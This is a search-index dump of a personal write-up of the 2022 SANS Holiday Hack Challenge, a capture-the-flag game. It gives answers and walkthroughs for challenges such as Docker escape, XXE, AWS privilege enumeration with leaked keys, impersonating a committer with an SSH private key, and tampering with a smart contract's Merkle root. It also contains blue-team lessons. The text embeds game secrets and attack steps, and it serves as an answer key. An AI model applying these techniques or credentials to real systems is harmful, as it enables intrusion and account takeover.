{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Overview","text":""},{"location":"#overview","title":"Overview","text":"<p>Hi and welcome to my 2022 SANS Holiday Hack Challenge write-up.</p> <p>Its my privilege to attend the Kringlecon for the third time. Since 202Every year I look forward to december and make every attempt to complete </p> <p>It has answers of all the objectives and how the 5 golden rings were obtained, high-level approach as well as details on how those answers were derived.</p>    <p>Objectives   completed</p>   <p>The Story</p>        <p>Five Rings for the Christmas king immersed in cold</p> <p>Each Ring now missing from its zone</p> <p>The first with bread kindly given, not sold</p> <p>Another to find 'ere pipelines get owned</p> <p>One beneath a fountain where water flowed</p> <p>Into clouds Grinchum had the fourth thrown</p> <p>The fifth on blockchains where shadows be bold</p> <p>One hunt to seek them all, five quests to find them</p> <p>One player to bring them all, and Santa Claus to bind   them</p>     <p>Answer to objectives and High-level approach</p>    <p>Objectives</p>   <p>Answer</p>   <p>High level approach to solve the objective</p>     <p>1. Kringlecon   Orientation</p>   <p>answer</p>   <p>Write \"answer\" in the top pane of the terminal   presented by the elf Jingle Ringford.</p>     <p>2. Wireshark   Practice</p>   <p>Q1: What type of objects can be exported from the   PCAP?   Answer: http</p>   <p>Open the pcap file using Wireshark.   Find the exportable files and then look the traffic details for those files.</p>        <p>Q2: What is the file name of the largest file we can   export?</p> <p>Answer: app.php</p>     <p>Q3: What packet number starts that app.php file?   Answer: 687</p>     <p>Q4: What is the IP of the Apache server?</p> <p>Answer: 192.185.57.242</p>     <p>Q5: Attackers used bad TLS certificates in this   traffic. Which countries were they registered to? Submit the names of the countries   in alphabetical order separated by comma (ex, Norway, South Korea)</p> <p>Answer: Ireland, Israel, South Sudan, United States</p>     <p>Q6: Is the host infected?</p> <p>Answer: Yes</p>     <p>3. Windows   Events Logs</p>   <p>Q1: What month/day/year did the attack take place? For   example, 09/05/2021</p> <p>Answer: 12/24/2022</p>   <p>Convert the .evtx file to csv and then use PowerShell   on CSV to answer questions.</p>     <p>Q2: An attacker got a secret from a file. What was the   original file's name?</p> <p>Answer: recipe</p>     <p>Q3: The contents of the previous file were retrieved,   changed, and stored to a variable by the attacker. This was done multiple   times. Submit the last full PowerShell line that performed only these   actions.   Answer: $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}</p>     <p>Q4: After storing the altered file contents into the   variable, the attacker used the variable to run a separate command that wrote   the modified data to a file. This was done multiple times. Submit the last full   PowerShell line that performed only this action.   Answer: $foo | Add-Content -Path 'Recipe'</p>     <p>Q5: The attacker ran the previous command against one   file multiple times. What is the name of this file?   Answer: Recipe.txt</p>     <p>Q6: Were any files deleted? (Yes/No)   Answer: Yes</p>     <p>Q7: Was the original file (from question 2) deleted?   (Yes/No)   Answer: No</p>     <p>Q8: What is the Event ID of the logs that show the   actual command lines the attacker typed and ran?   Answer: 4104</p>     <p>Q9: Is the secret ingredient compromised (Yes/No)?   Answer: Yes</p>     <p>Q10: What is the secret ingredient?   Answer: Honey</p>     <p>4. Suricata   regatta</p>   <p>Q1: Create a Suricata rule to catch DNS lookups for   adv.epostoday.uk.</p> <p>Whenever there's a match, the alert message (msg)   should read Known bad DNS lookup, possible Dridex infection</p> <p>Answer: alert dns any any -&gt; any any   (msg:\"Known bad DNS lookup, possible Dridex infection\"; dns_query;   content:\"adv.epostoday.uk\"; depth:20; fast_pattern; endswith;   nocase; classtype:pup-activity; sid:200; rev:2;)</p>   <p>Follow the syntax noted in the hint   link to create our own rules needed for the challenge.</p>     <p>Q2: Develop a Suricata rule that alerts whenever the   infected IP address 192.185.57.242 communicates with internal systems over   HTTP.</p> <p>When there's a match, the message (msg) should read   Investigate suspicious connections, possible Dridex infection</p> <p>Answer: alert http any any -&gt; any any   (msg:\"Investigate suspicious connections, possible Dridex infect\";   sid:300; rev:2;)</p>     <p>Q3: We heard that some naughty actors are using TLS   certificates with a specific CN.</p> <p>Develop a Suricata rule to match and alert on an SSL   certificate for heardbellith.Icanwepeh.nagoya.</p> <p>When your rule matches, the message (msg) should read   Investigate bad certificates, possible Dridex infection</p> <p>Answer: alert tls any any -&gt; any any   (msg:\"Investigate bad certificates, possible Dridex infection\"; tls.subject:\"CN=heardbellith.Icanwepeh.nagoya\";   sid:400; rev:2;)</p>     <p>Q4: Watch for one line from the Javascript: Let   byteCharacters = atob</p> <p>Oh, and that string might be Gzip compressed - I hope   that\"s OK!</p> <p>Just in case they try this again, please alert on that   HTTP data with message Suspicious Javascript function, possible Dridex   infection</p> <p>Answer: alert http any any -&gt; any any   (msg:\"Suspicious JavaScript function, possible Dridex infection\";   file_data; content:\"let byteCharacters = atob\"; sid:500; rev:2;)</p>     <p>5. Clone   with a difference</p>   <p>maintainers</p>   <p>Create an empty git repo, add the remote repo to it,   then fetch and checkout the master branch.</p>     <p>6. Prison   Escape</p>   <p>082bb339ec19de4935867</p>   <p>User is privileged in docker. Mount the   host drive and access the file in the host /home folder.</p>     <p>7. Jolly   CI/CD</p>   <p>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>   <p>Get the private key from user\"s previous commit, clone   with SSH key, commit a webshell and use the webshell to get the flag.</p>     <p>8. Naughty   IP</p>   <p>18.222.86.32</p>   <p>Wireshark    Statistics &gt; Conversations </p>     <p>9. Credential   mining</p>   <p>alice</p>   <p>Use Wireshark filters</p>     <p>10. 404 FTW</p>   <p>/proc</p>   <p>Use Wireshark filters and display filters.</p>     <p>11. IMDS, XXE, and Other   Abbreviations</p>   <p>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance   </p>   <p>Look for 169.254.169.254 as dest ip in Wireshark.</p>     <p>12. Open boria mine door</p>   <p>Solved in the game</p>   <p>Used SVG in HTML and JS.</p>     <p>13. Glamtariels Fountain</p>   <p>goldring-morethansupertopsecret76394734.png</p>   <p>Used XXE injection.</p>     <p>14. AWS CLI Intro</p>   <p>Solved in the console</p>   <p>Follow the instructions</p>     <p>15. Trufflehog Search</p>   <p>put_policy.py</p>   <p>Install Trufflehog on local machine and   used on given repo.</p>     <p>16. Exploitation via AWS   CLI</p>   <p>Solved in the game</p>   <p>Configure the creds found via Trufflehog   and then use AWS CLI on it to get lambda URLs.</p>     <p>17. Buy A Hat</p>   <p>Solved in the game</p>   <p>Followed the instructions.</p>     <p>18. Blockchain   Divination</p>   <p>0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554</p>   <p>The \"To address\" in the transaction has   the answer.</p>     <p>19. Exploit a smart   contract</p>   <p>Solved in the game</p>   <p>Build our own Merkle tree with our wallet   address and pass it on the website replacing the hardcoded \"root\" value with   the root value of our own Merkle tree with our wallet/proof.</p>"},{"location":"Conclusion/","title":"Conclusion","text":"<p>Per Santa, the golden rings were stolen by the Smilegol and buried deep in the tunnel. By possession of those rings, Smilegol spellbound as a Grinchum. But we were able to recover all the rings by solving all the challenges and return them back to Santa. That freed Smilegol from the spell and he was restored back to his original self and the holiday season was saved!</p>"},{"location":"CyberSecurityLearnings/","title":"Cyber Security Learnings","text":"<p>These are my notes on the challenges from blue team perspective on what detection/prevention measures could be taken to prevent exploitation/compromise involved in the challenges.</p>  <p>Wireshark Practice</p> <p>The host got infected because the user clicked on a link an email to download a zip file.  Below measures could help in preventing this :</p> <p>1) Email Monitoring to detect and potentially quarantine emails from suspicious senders.</p> <p>2) Network monitoring and prevention on which external domains/IP user can go to.</p> <p>3) EDR on workstations to block executions on suspicious files.</p> <p>4) Phishing simulations on uses with the intent to educate them to not click on arbitrary links.</p>  <p>Windows Events Logs </p> <p>- Enable PowerShell Auditing </p> <p>- EDR on hosts to block execution of suspicious executables based on behavior (keylogging)</p>  <p>Prison Escape</p> <p>The user in the container was a privileged user and that allowed them to mount the host drives and then access them.</p> <p>- Dont assign root privileges to the users in a container.</p>  <p>Jolly CI/CD</p> <p>The developer checked in their SSH private key in the GitLab repo.</p> <p>- The GitLab repos should be monitored for hard coded SSH keys or any sensitive information relevant to the organization</p> <p>- Upon detection of sensitive keys [e.g., SSH private key] in the repo, the keys should be rotated immediately.</p>  <p>Naughty IP &amp; Credential Mining</p> <p>That one IP address 18.222.86.32 sent &gt;900 POST requests to /login.html within the same minute 10/05/2022 16:46  a clear case of brute force attempt.</p> <p>- Implement strong passwords and for the compromised logins, reset passwords.</p> <p>- Implement rate limiting so we dont see so many attempts in a short time</p> <p>- Implement MFA to stop the attacker if the password is compromised.</p> <p>- Implement BOT protection/Captcha to prevent automated attempts.</p>  <p>IMDS, XXE and other abbreviations</p> <p>In this case AWS EC2 Instance Metadata Service version 1 was used which allows programmatic access to metadata about the EC2 instance, its network and Its storage and that would include security credentials too. - Use IMDSv2 instead which makes it harder for an attacker to exploit than IMDSv1.</p>  <p>Open Boria Mine Door</p> <p>We can send the inline Javascript as input because of the insecure content security policy unsafe-inline'</p> <p>- Implement strict content security policy depending upon the architecture of the app.</p> <p>- Implement output encoding of HTML and Javascript on the server side using corresponding standard framework libraries.</p> <p>This illustrates usage of a Node.js library to encode Javascript.</p>  <p>Glamtariels fountain</p> <p>This leveraged XXE (XML External Entity) injection to retrieve arbitrary files from the host system.</p> <p>XXE injection leverages DTD (Document Type Definition) processing which we should disable altogether when loading the input XML on the backend. Here is an example .NET framework property which can be used to totally prohibit DTD processing which will prevent XXE injection.</p>  <p>Exploit a smart contract</p> <p>I think if the root hex value was not hardcoded in the request payload and visible for every request, we would not have been able to inject our own Merkle tree. If It was not hardcoded and our wallet/proof values were checked with the root hex of the Merkle tree on the server side, It would have been difficult to exploit this.</p> <p>- Never hardcode any input.</p> <p>- Any artifact which is needed to make a logical/business decision, have a server side check on them to prevent any security issue with the business logic.</p>"},{"location":"KringleconOrientation/","title":"KringleconOrientation","text":"<p>Upon login on https://2022.kringlecon.com, we are greeted by Jingle Ringford guarding the entry.</p>  <p>Jingle Ringford notes 5 golden rings on the badge which will show objectives, hints. links talks, achievements, destinations, and general settings.</p> <p>Asks to click on the nearby KTM to generate a crypto wallet for ourselves.</p> <p>We click on the KTM which opens another window for us to click on a link to create account.</p>                <p>Clicking on the link in popup window shows our wallet address and key which we copy it away.</p>        <p>Wallet Address: </p> <p>0xBC94c917D66B2eB6b4209ccEEe58297D63512CE5</p> <p>Key: </p> <p>0x463686edf52a3d812412ee1abbaadf64ea440fbc788dfb06ead3700371122ef7</p>    <p>The elf asks to click on the Cranberry Pi terminal and asks to type \"answer\" in it and hit enter.  We do so and the gate to the North pole is opened.</p>"},{"location":"ReturningRingsToSanta/","title":"Returning Rings to Santa","text":"<p>After recovering all the rings, we talk back to Santa, and he asks to go into the castle. Notice the castle door is opened. We can enter it. We meet Santa in the castle. He congratulates us and we take customary selfie with him.</p>"},{"location":"WanderingAroundTheNorthPole/","title":"Wandering Around The North PoleExploring the tunnel and the doors for rings and challenges therein","text":"<p>Upon entering the north pole, as a first step, we talk to Santa who states his 5 golden rings have gone missing and seeks help. Upon talking to Santa, several objectives get unlocked.</p>                    <p>We are tasked with recovering the 5 golden rings</p>      <p>In the north pole, we meet with Chimney Scissorsticks.</p>    <p>Chimney Scissorsticks notes that there   are elves burrowed under the snow.</p> <p>There are three tunnels in the area but   looks like there is only one of them we can get into.</p>  <p>Upon entering, we can see there is a   ladder which lets us get down the tunnel.</p>        <p>Went down the tunnel and looked inside each tunnel door. Each tunnel door (except hall of talks) door is named after a golden ring and has objectives/challenges to solve which implies if we solve all the objective behind a door, we recover the corresponding ring. In addition, we get Kringle Coins (KC) upon solving objectives which may be used to buy hats and NFTs.</p>                      <p>Wireshark Phishing</p>   <p>Windows Event Logs</p>   <p>Suricata Regatta</p>        <p>Clone with a difference</p>   <p>Prison Escape</p>   <p>Jolly CI/CD</p>        <p>Naughty IP, Credential Mining</p> <p>404 FTW, IMDS/XXE</p>   <p>Boria Mine Door</p>   <p>Glamtariel's Fountain</p>        <p>AWS CLI Intro</p>     <p>Trufflehog Search</p> <p>Exploitation via AWS CLI</p>        <p>Buy a hat</p>   <p>Blockchain Divination</p>   <p>Exploit a Smart Contract</p>"},{"location":"BurningRingOfFire/BlockchainDivination/","title":"Blockchain Divination","text":"<p>Blockchain   Divination Burning   Ring of fire Slicmer</p>             <p>Hints :   - Look at the transaction information. There is a From: address and a To:   address. The To: address lists the address of the KringleCoin smart contract.  </p> <p>- Find a   transaction in the blockchain where someone sent or received KringleCoin! The   Solidity Source File is listed as KringleCoin.sol. Tom's Talk might be helpful!</p>       <p>The question is At what address is the KringleCoin   smart contract deployed.   Now If we look at the hint it clearly notes the To: Address in the   transaction is where the smart contract is deployed. Look at the transaction information. There is a From: address and a To:   address. The To: address lists the address of the KringleCoin smart   contract.</p>     <p>Now we look   at the transaction. There is only one transaction (transaction 0) where the   To address is noted.</p>          <p>Answer : 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554</p>     <p>We submit the answer, and the objective is now   completed and we get 50 coins as well.</p>"},{"location":"BurningRingOfFire/BuyaHat/","title":"Buy a hat","text":"<p>Buy a   hat   Burning   Ring of fire Wombley   Cube</p>             <p>Hints :   - You should have been given a target address and a price by the Hat Vending   machine. You should also have been given a Hat ID #. Approve the transaction   and then return to the Hat Vending machine. You'll be asked to provide the   Hat ID and your wallet address. Complete the transaction and wear your hat   proudly!  </p> <p>- Before you can purchase something with KringleCoin,   you must first approve the financial transaction. To do this, you need to   find a KTM; there is one in the Burning Ring of Fire. Select the Approve a   KringleCoin transfer button. You must provide the target wallet address, the   amount of the transaction you're approving, and your private wallet key.</p>       <p>From the vending machine, we choose a hat. It has clear   instructions below which we copy away.</p>     <p>Use a KTM to pre-approve a 10 KC transaction to the   wallet address: 0x84f99D34e74f081624785EF217B5910a438E4296</p> <p>Return to this kiosk and use Hat ID: 169 to complete   your purchase.</p>     <p>Vending machine</p>   <p>Chosen hat</p>   <p>Instructions to buy the hat</p>                <p>We then go to nearby KTM and check our wallet balance   first. Please note our wallet address is :   0xBC94c917D66B2eB6b4209ccEEe58297D63512CE5</p>     <p>KTM</p>   <p>Checking   the wallet balance. Its 505 KC.</p>             <p>We then   pre-approve the transaction with 10 KC (value of our hat) and buy the hat   with below information</p>     <p>To Address :</p> <p>0xBC94c917D66B2eB6b4209ccEEe58297D63512CE5   Amount (KC) :10  </p>             <p>The transaction is pre-approved!</p>               <p>Now we return to the vending machine and click on :</p>          <p>We supply the below information :   Your wallet address :    0xBC94c917D66B2eB6b4209ccEEe58297D63512CE5   Your Key :    0x463686edf52a3d812412ee1abbaadf64ea440fbc788dfb06ead3700371122ef7   Hat ID : 115</p>     <p>Transaction   successful and we have bought a new hat!</p>                      <p>With this,   the objective is now completed.</p>"},{"location":"BurningRingOfFire/ExploitaSmartContract/","title":"Exploit a Smart Contract","text":"<p>Exploit a smart   contract Burning   Ring of fire Luigi</p>             <p>Hints :   - You're going to need a Merkle   Tree of your own. Math is hard. Professor   Petabyte can help you out.</p>             <p>Challenge is :</p> <p>Exploit flaws in a smart contract to buy   yourself a Bored Sporc NFT.</p>     <p>If we look at the BSRS (The Bored Sporc Rowboat   Society https://boredsporcrowboatsociety.com/,   there are two sections : Gallery and Presale</p>     <p>The presale has some very important notes :</p> <p>The presale is only available to those select   individuals who have earned a place on our exclusive presale list.</p> <p>you're gonna want to make sure that your wallet   address is on the approved list. </p> <p>To check if you're on the list, enter your wallet   address and the string of proof values that we gave you when we told you that   you were on the pre-approved list.</p> <p>Before you do anything else, it's always good to be   sure you're doing everything right and your address is validated as being on   the list (it's actually something called a Merkle Tree... very high-techy-techy   stuff)</p>               <p>Based on above notes, we can conclude there is a list   of pre-approved wallet addresses based on Merkle Tree maintained by the   website.</p> <p>When we enter our wallet address on this page and some   \"proof\" values ( we need to understand what they are), they are   going to be checked if they are in the list.</p>               <p>As a first step, let us try putting our wallet address   which is 0xBC94c917D66B2eB6b4209ccEEe58297D63512CE5 and some test hex values.</p> <p>On repeated tests, we see an interesting root value   [0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1] which is   always being sent in the payload request as if being hardcoded. This may of   interest later.</p>             <p>Then   we watch the below talk by Prof. Qwerty Petabyte as noted in the hint</p> <p>Prof.   Qwerty Petabyte, You Can Still Have Fun With Non-Fungible Tokens | KringleCon   2022</p>     <p>This   talk notes that Merkle tree are data structures that is used in various   purposes in NFT contracts and cites \"creating pre-sale allow-list\"   as an example.</p> <p>So,   we need to understand Merkle tree first because the BSRS challenge is about a   pre-sale list and this is the relevant section from the talk which explains   it very well.</p>               <p>But its the section \"why Merkle   trees are interesting\" of the talk which is very useful for this   challenge.</p> <p>We note what Prof Petabyte says in the   talk :</p> <p>If we are trying to verify/prove the leaf   node belongs to our tree we need :</p> <ul> <li>Original piece of data        we are trying to verify </li> <li>we need to know direct        neighboring leaf node for that hash if there is any </li> <li>Neighboring parent        hashes directly above the leaf node</li> <li>Value        of the root node (remember we have a known root value )</li> </ul>     <p>Prof Petabyte also notes that they would make some   code available in Github. Which GitHub repo is it? </p>     <p>Googling   QwertyPetabyte reveals their twitter handle</p> <p>https://twitter.com/qpetabyte?lang=en</p> <p>One of   the tweets [https://twitter.com/QPetabyte/status/1602315534049153024] notes the Github repo :</p> <p>https://github.com/QPetabyte/Merkle_Trees</p>     <p>The Github   repo has a python script to build our own Merkle tree. All It needs is a list   of hex values and it will build a Merkle tree.   Below is from the script noting we can use a list of any sample hex values   AND the hex value which we need proof for.</p>              <p>So, we will build our own Merkle tree using supplying   our own wallet address and a null hex value</p>          <p>Now executing the changed script</p>     <p>python .\\merkle_tree.py</p>     <p>It has generated a Merkle tree with a its own root and   proof values.</p>          <p>As we know the BSRS pre-sale page is checking the   entered wallet address in its Merkle tree and of course It won't exist.</p> <p>BUT what if we pass   our own Merkel tree to the Pre-sale page.</p> <p>How do we do that?</p> <p>What if we send root   value of our Merkle tree instead of their original root value and send our   proof values along with our wallet address.</p>     <p>First intercept the traffic by keeping the   \"Validate\" checkbox checked using Burpsuite and send the traffic to   repeater. Then change the request payload with below values</p>        <p>Root:   0x5c0f93e7858ad6f8aead855b1d145d416cb5051e3560142c8c34b53849e60447</p>  <p>Proof:   0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a</p>  <p>Wallet   Address : </p> <p>0xBC94c917D66B2eB6b4209ccEEe58297D63512CE5</p>      <p>And looks like we are in the list as the response is :   \"You're on the list and good to go! Now... BUY A SPORC!\"</p>            <p>Next we uncheck the \"Validate\" checkbox and   then send the transaction</p>          <p>This time we see below response :</p> <p>There was some sort of issue with us getting the 100   KC. Please make sure you have all the information correct.</p>          <p>The transaction is valid but cannot complete because   of insufficient funds.</p> <p>So, I need to pay 100KC to the wallet address of BSRS   with below information :</p> <p>My key :   0x463686edf52a3d812412ee1abbaadf64ea440fbc788dfb06ead3700371122ef7</p> <p>To Address :   0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a</p> <p>Amount (KC) 100</p>              <p>Now that we have paid 100KC.</p> <p>We go back to burp suite and submit the transaction   with validate set to \"true\"</p> <p>We immediately see the below success message in the   response and web app shows objective completed.</p>     <p>\"Success!   You are now the proud owner of BSRS Token #000286. You can find more   information at https://boredsporcrowboatsociety.com/TOKENS/BSRS286, or check it out in the   gallery!&lt;br&gt;Transaction:   0x93a2a4544d514398ccc44b4b3d58414bfb2b3670aee1e630dd244f39164f5cca, Block:   78709&lt;br&gt;&lt;br&gt;Remember: Just like we planned, tell everyone you   know to &lt;u&gt;&lt;em&gt;BUY A   BoredSporc&lt;/em&gt;&lt;/u&gt;.&lt;br&gt;When general sales start, and the   humans start buying them up, the prices will skyrocket, and we all sell at   once!&lt;br&gt;&lt;br&gt;The market will tank, but we'll all be rich!!!\"</p>          <p>The achivement is now unlocked and we get 100 coins as   well.</p>          <p>Going to the URL https://boredsporcrowboatsociety.com/TOKENS/BSRS286   noted in the response message shows below.</p>            <p>Going to the above link shows my first ever NFT https://boredsporcrowboatsociety.com/TOKENS/TOKENIMAGES/BSRS286.png</p>          <p>At this point we have recovered the burning ring of   fire and every other ring!  </p>"},{"location":"CloudRing/AWSCLIIntro/","title":"AWS CLI Intro","text":"<p>AWS   CLI Intro     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Cloud   Ring     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Jill   Underpole</p>                <p>Type aws help to see the CLI help messages</p>          <p>Configure AWS credentials : </p> <pre><code>aws configure\n</code></pre>          <p>Get caller Identity : </p> <pre><code>aws sts get-caller-identity\n</code></pre>          <p>Upon getting the callers identity, the objective is   completed and we get 5 coins as well.</p>"},{"location":"CloudRing/ExploitationViaAWSCLI/","title":"Exploitation Via AWS CLI","text":"<p>Exploitation via AWS   CLI  Cloud   Ring     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Sulfrod</p>             <p>Hints :   AWS inline   policies pertain to one identity while managed policies can be attached   to many identities.</p>     <p>We have AWS credentials from the previous challenge   Trufflehog Search   aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\",</p> <p>aws_secret_access_key=\"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\"</p>     <p>Configure aws cli with the above credentials</p>     <p>aws configure</p>          <p>aws sts get-caller-identity</p>          <p>haug is the user. Get the policy attached to this   user.</p>     <p>aws iam list-attached-user-policies --user-name haug</p>                 <p>Get   the details of the policy TIER1_READONLY_POLICY attached to the user</p>  <p>     <p>aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY</p>  <p>       <p>     <p>Get the default version of the policy  TIER1_READONLY_POLICY</p>     <p>aws iam get-policy-version --policy-arn   arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1</p>          <p>Get the inline policy attached to the user</p>     <p>aws iam list-user-policies --user-name haug</p>          <p>The policy attached to the user is S3Perms. Get   details of this policy.</p>     <p>aws iam get-user-policy --user-name haug --policy-name   S3Perms</p>          <p>The earlier command discolosed name of an s3 bucket   named smogmachines3. List its objects.</p>     <p>aws s3api list-objects --bucket smogmachines3</p>          <p>Tha attached user policy provided us lambda privileges.   List all the lamda functions.</p>     <p>aws lambda list-functions</p>     <p>Lambda functions can have public URLs from which they   are directly accessible. Use AWS CLI to get the configuration containing the   public URL.</p>     <p>First, we get the function details</p>     <p>aws lambda list-functions | head -10</p>             <p>Get the configuration containing the public URL of the   lambda function smogmachine_lambda</p>     <p>aws lambda get-function-url-config --function-name   smogmachine_lambda</p>          <p>Lambda   function URL : https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/</p>     <p>We   submit the answer and the objective is now completed. And we get 25 coins as   well</p>          <p>At this point we   have retrieved   the cloud ring</p>"},{"location":"CloudRing/TrufflehogSearch/","title":"Trufflehog Search","text":"<p>Trufflehog Search    Cloud   Ring     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Sulfrod</p>             <p>Hints :   - Git lab repo https://haugfactory.com/orcadmin/aws_scripts</p> <p>- You can search for secrets in a Git repo with   trufflehog git https://some.repo/here.git.</p>        <p>Installed trufflehog in local machine and scanned the Github   repo with it.</p>     <pre><code>trufflehog https://haugfactory.com/asnowball/aws_scripts.git\n</code></pre>          <p>File put_policy.py contains the AWS credentials</p>     <p>Answer : put_policy.py</p>     <p>We submit the answer, and the objective is now   completed and we get 10 coins as well</p>"},{"location":"ElfenRing/CloneWithaDifference/","title":"Clone with a difference","text":"<p>Clone   with a difference    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Elfen   Ring    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Bow   Ninecandle</p>             <p>Hint from Bow Ninecandle There's a consistent format for Github repositories cloned via HTTPS. Try converting!</p>       <p>Clicking on the terminal icon shows the below challenge</p>          <p>Create an empty git repository</p>     <pre><code>git init\n</code></pre>               <p>Add the remote repository   https://haugfactory.com/asnowball/aws_scripts.git</p>     <pre><code>git remote add origin https://haugfactory.com/asnowball/aws_scripts.git\n</code></pre>          <p>Enumerate objects in the remote git repo</p>     <pre><code>  git fetch\n</code></pre>               <p>Check the origin</p>     <pre><code>git remote show origin\n</code></pre>               <p>Checkout</p>     <pre><code>git checkout -b master origin/main\n</code></pre>          <p>The files are downloaded and we can see the README.md</p>            <p>The last word in the README.md is maintainers</p>          <p>Answer : maintainers</p>          <p>The objective is now completed and we get 5 coins as   well </p>"},{"location":"ElfenRing/JollyCICD/","title":"Jolly CI/CD","text":"<p>Jolly   CI/CD \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Elfen   Ring \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Rippin   Proudboot</p>             <p>Hints 1) The thing about Git is that every step of development is accessible    even steps you didn't mean to take! git log can show code skeletons.</p> <p>2) Gitlab repo http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</p> <p>3) If you find a way to impersonate another identity,   you might try re-cloning a repo with their credentials.</p>       <p>Clone the git repo and get into the directory where it   was cloned into</p>     <pre><code>git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git\ncd wordpress.flag.net.internal\n</code></pre>          <p>Get git logs. Shows a commit with potential mistake   with whoops comment</p>     <pre><code>git log --oneline\n</code></pre>           <p>Show the log with commits. Looks like   sporx@kringlecon.com committed with \"whoops\" comment.</p>     <pre><code>git log\n</code></pre>          <p>Show what was committed under that id e19f653bde9ea3de6af21a587e41e7a909db1ca5   Looks like user has committed their the private and public key. So we will   use these to clone the repo and commit changes impersonating the user</p>     <pre><code>git show e19f653bde9ea3de6af21a587e41e7a909db1ca5\n</code></pre>          <p>Create .ssh folder and create the private key (.deploy)   and public key(.deploy.pub) from the contents above</p>     <pre><code>mkdir /home/samways/.ssh\ncd /home/samways/.ssh\nnano .deploy\n</code></pre> <p>-----BEGIN   OPENSSH PRIVATE KEY-----</p> <p>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</p> <p>QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5</p> <p>9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g</p> <p>AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot</p> <p>PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==</p> <p>-----END   OPENSSH PRIVATE KEY-----</p>  <pre><code>nano .deploy.pub\n</code></pre> <p>ssh-ed25519   AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri   sporx@kringlecon.com</p>      <p>Set the full read and write permission only for the   owner</p>     <pre><code>chmod 600 .deploy\nchmod 600 .deploy.pub \nls -lah\n</code></pre>          <p>Set the git config email and name</p>     <pre><code>git config --global user.email \"sporx@kringlecon.com\"\ngit config --global user.name \"knee-oh\"\n</code></pre>          <p>Start the SSH agent</p>     <pre><code>eval \"$(ssh-agent -s)\"\n</code></pre>          <p>Add the SSH private key to the SSH agent</p>     <pre><code>ssh-add .deploy\n</code></pre>          